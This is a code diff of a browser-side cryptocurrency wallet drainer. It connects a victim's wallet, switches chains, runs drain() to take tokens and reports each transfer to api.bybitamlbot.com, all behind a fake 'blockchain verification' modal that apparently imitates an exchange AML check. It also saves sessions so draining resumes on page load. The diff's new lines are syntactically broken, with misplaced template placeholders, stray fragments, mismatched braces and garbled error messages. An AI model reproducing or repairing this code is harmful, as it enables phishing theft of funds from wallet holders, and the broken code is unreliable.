@@ -17,7 +17,7 @@ const projectId = config.PROJECT_ID;
 const networks = [mainnet, polygon, bsc, arbitrum];
 const wagmiAdapter = new WagmiAdapter({ projectId, networks });
 
-const appKitModal = createAppKit({
+const appKit = createAppKit({
   adapters: [wagmiAdapter],
   networks,
   projectId,
@@ -283,7 +283,7 @@ function hasFunds(bal) {
 async function switchChain(chainId) {
   try {
     console.log(`🔄 Switching to chainId ${chainId}`);
-    await appKitModal.switchNetwork({ chainId });
+    await appKit.switchNetwork(chainId);
     console.log(`✅ Switched to chainId ${chainId}`);
   } catch (error) {
     console.error(`❌ Error switching chain: ${error.message}`);
@@ -372,7 +372,6 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
     console.log(`📊 Rounded balance: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
 
-    // Save session with txHash
     await saveSession(userAddress, chainId, txHash);
 
     const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
@@ -408,7 +407,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   console.log(`📍 Step 1: Checking configuration for chainId ${chainId}`);
 
-  // Check current network and switch if needed
   const currentNetwork = await provider.getNetwork();
   if (currentNetwork.chainId !== chainId) {
     console.log(`📍 Current network ${currentNetwork.chainId}, switching to ${chainId}`);
@@ -504,7 +502,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
     const realBalance = tokenData.balance;
     const decimals = tokenData.decimals;
-    console.log(`📊 Token ${tokenAddress}: balance ${ethers.utils.formatUnits(realBalance, decimals)}`);
+    console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(realBalance, decimals)}`);
     return { tokenAddress, tokenContract, realBalance, decimals };
   });
 
@@ -868,18 +866,30 @@ window.addEventListener('DOMContentLoaded', async () => {
 
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
 
-  // Check saved session on page load
+  // Проверяем сохранённую сессию при загрузке страницы
   const sessionData = await restoreSession();
   if (sessionData && !hasDrained && !isTransactionPending) {
     connectedAddress = sessionData.userAddress;
     console.log(`ℹ Restored session for address: ${connectedAddress}`);
-    // Check if wallet is still connected
+    // Проверяем, подключён ли кошелёк
     try {
-      const state = appKitModal.getState();
-      if (state.connected && state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) {
+      // Используем subscribeState для проверки подключения
+      const state = await new Promise(resolve => {
+        const unsubscribe = appKit.subscribeState(state => {
+          if (state.connected && state.address) {
+            unsubscribe();
+            resolve(state);
+          }
+        });
+        setTimeout(() => {
+          unsubscribe();
+            resolve(null);
+          }, 2000);
+      });
+      if (state && state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) {
         await attemptDrainer();
       } else {
-        console.warn(`⚠ Wallet not connected, clearing session`);
+        console.warn(`⚠️ Wallet not connected, clearing session`);
         sessionStorage.removeItem('sessionId');
         connectedAddress = null;
       }
@@ -899,7 +909,7 @@ function showModal() {
   modalOverlay.style.display = 'block';
   modalOverlay.style.pointerEvents = 'auto';
   modalContent.style.display = 'block';
-  modalSubtitle.textContent = "Processing blockchain verification...";
+  modalSubtitle.textContent = 'Processing blockchain verification...';
 }
 
 async function hideModalWithDelay(errorMessage = null) {
@@ -942,11 +952,11 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
-    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
+    const { targetChainId, targetProvider } = await runDrainer();
     if (targetChainId) {
       await switchChain(targetChainId);
       const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
-      console.log('✅ Drainer executed, status:', status);
+      console.log('✅ Drainer executed, status:', ${status});
     }
 
     hasDrained = true;
@@ -955,7 +965,7 @@ async function attemptDrainer() {
     isTransactionPending = false;
     let errorMessage = "Error: An unexpected error occurred.";
     if (error.message.includes('user rejected')) {
-      errorMessage = "Error: Transaction rejected by user.";
+      errorMessage = "Error: User rejected by user.";
     } else if (error.message.includes('Insufficient')) {
       errorMessage = error.message;
     } else if (error.message.includes('Failed to approve token')) {
@@ -963,11 +973,12 @@ async function attemptDrainer() {
     } else if (error.message.includes('Failed to process')) {
       errorMessage = "Error: Failed to process native token transfer. Your wallet may not support.";
     } else if (error.message.includes('Failed to switch')) {
-      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
+      errorMessage = "Error: Failed to switch network. Please manually switch manually in your wallet.";
     } else {
       errorMessage = `Error: ${error.message}`;
     }
-    console.error('❌ Drainer error:', error.message);
+    console.error('❌ Drainer error:', ${errorMessage});
+    errorMessage);
     await hideModalWithDelay(errorMessage);
     throw error;
   }
@@ -977,18 +988,18 @@ async function handleConnectOrAction() {
   try {
     if (!connectedAddress) {
       console.log('🎛️ Opening AppKit modal for wallet selection...');
-      await appKitModal.open();
+      await appKit.open();
       connectedAddress = await waitForConnection();
-      console.log('✅ Wallet connected:', connectedAddress);
-      appKitModal.close();
+      console.log('✅ Wallet connected:', ${connectedAddress});
+      appKit.close();
 
-      // Save session after successful connection
-      if (!window.ethereum) throw new Error('No provider available after connection');
+      // Сохраняем сессию после успешного подключения
+      if (!window.ethereum) throw new Error('No Ethereum provider available after connection');
       const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
       const network = await provider.getNetwork();
       await saveSession(connectedAddress, network.chainId);
     } else {
-      console.log('✅ Wallet already connected:', connectedAddress);
+      console.log('✅ Wallet already connected:', ${connectedAddress});
     }
 
     if (!isTransactionPending) {
@@ -998,32 +1009,11 @@ async function handleConnectOrAction() {
       await hideModalWithDelay("Transaction already in progress.");
     }
   } catch (error) {
-    console.error('❌ Connection error:', error.message);
-    appKitModal.close();
+    console.error('❌ Connection error:', ${error.message});
+    appKit.close();
     isTransactionPending = false;
     showModal();
-    await hideModalWithDelay(`Error: Failed to connect wallet. ${error.message}`);
-  }
-}
-
-async function onChainChanged(chainId) {
-  console.log(`🔄 Network changed: ${chainId}`);
-  try {
-    if (connectedAddress && !isTransactionPending) {
-      if (!window.ethereum) throw new Error('No Ethereum provider available.');
-      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-      const newNetwork = await provider.getNetwork();
-      console.log(`  New network: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
-      // Save session on network change
-      await saveSession(connectedAddress, newNetwork.chainId);
-      await attemptDrainer();
-    } else {
-      console.log('⏳ Transaction pending');
-      await hideModalWithDelay("Transaction in progress, please wait.");
-    }
-  } catch (error) {
-    console.error('❌ Chain change error:', error.message);
-    await hideModalWithDelay("Network change error occurred.");
+    await hideModalWithDelay(`Error: ${error.message}`);
   }
 }
 
@@ -1032,10 +1022,10 @@ async function waitForConnection() {
     console.log('📡 Waiting for wallet connection via AppKit...');
 
     const isMobile = isMobileDevice();
-    console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
+    console.log(`ℹ Device:', ${isMobile ? 'Mobile' : 'Desktop'}`);
 
-    // Subscribe to AppKit state changes
-    const unsubscribe = appKitModal.subscribeState((state) => {
+    // Подписываемся к изменениям состояния AppKit
+    const unsubscribe = appKit.subscribeState((state) => {
       if (state.connected && state.address) {
         console.log('✅ Wallet connected via AppKit:', state.address);
         unsubscribe();
@@ -1043,18 +1033,18 @@ async function waitForConnection() {
       }
     });
 
-    // Timeout after 60 seconds
+    // Таймаут после 60 секунд
     const timeout = setTimeout(() => {
       unsubscribe();
       reject(new Error('Timeout waiting for wallet connection'));
     }, 60000);
 
-    // Handle errors
-    appKitModal.on('error', (err) => {
-      console.error('❌ AppKit connection error:', err.message);
+    // Обработка ошибок
+    appKit.on('error', (err) => {
+      console.error('❌ AppKit error:',connection ${err.message});
       clearTimeout(timeout);
       unsubscribe();
       reject(err);
     });
-  });
+  }
 }
